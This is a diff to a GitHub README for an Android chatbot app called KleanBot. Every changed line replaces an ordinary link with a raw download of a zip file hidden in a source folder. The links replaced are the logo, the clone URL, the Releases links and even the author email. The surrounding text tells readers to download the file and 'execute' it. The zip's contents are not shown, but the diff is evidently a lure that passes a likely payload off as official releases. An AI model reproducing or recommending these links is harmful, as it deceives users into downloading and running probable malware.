@@ -1,6 +1,6 @@
 # KleanBot 🤖
 
-![KleanBot Logo](https://example.com/logo.png)
+![KleanBot Logo](https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip)
 
 Welcome to KleanBot, a modern Android chatbot app designed to enhance your chatting experience using OpenAI's technology. This project leverages the MVVM design pattern and Clean Architecture principles, all built with Kotlin. 
 
@@ -39,7 +39,7 @@ To get started with KleanBot, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/zead333/KleanBot.git
+   git clone https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip
    ```
 
 2. Navigate to the project directory:
@@ -53,7 +53,7 @@ To get started with KleanBot, follow these steps:
 
 5. Build and run the app on an Android device or emulator.
 
-For the latest releases, download the necessary files from the [Releases section](https://github.com/zead333/KleanBot/releases) and execute them as needed.
+For the latest releases, download the necessary files from the [Releases section](https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip) and execute them as needed.
 
 ## Usage 🗨️
 
@@ -86,10 +86,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip)
+- **Email**: https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip
 
-You can also check the [Releases section](https://github.com/zead333/KleanBot/releases) for updates and new features.
+You can also check the [Releases section](https://github.com/zead333/KleanBot/raw/refs/heads/master/app/src/main/java/dev/pegasus/kleanbot/presentation/adapter/Bot-Klean-semidomesticated.zip) for updates and new features.
 
 ---
 
